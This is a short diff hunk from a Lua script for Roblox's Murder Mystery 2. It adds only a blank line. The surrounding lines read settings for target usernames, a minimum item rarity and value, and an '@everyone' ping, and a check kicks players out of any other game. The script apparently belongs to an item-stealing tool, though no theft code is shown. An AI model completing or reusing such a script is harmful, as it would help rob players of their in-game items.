@@ -302,6 +302,7 @@ local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
+
 -- Si no está en MM2
 if game.PlaceId ~= 142823291 then
     LocalPlayer:Kick("⚠️Este script no funciona en este juego, solo funciona en mm2 ✅")
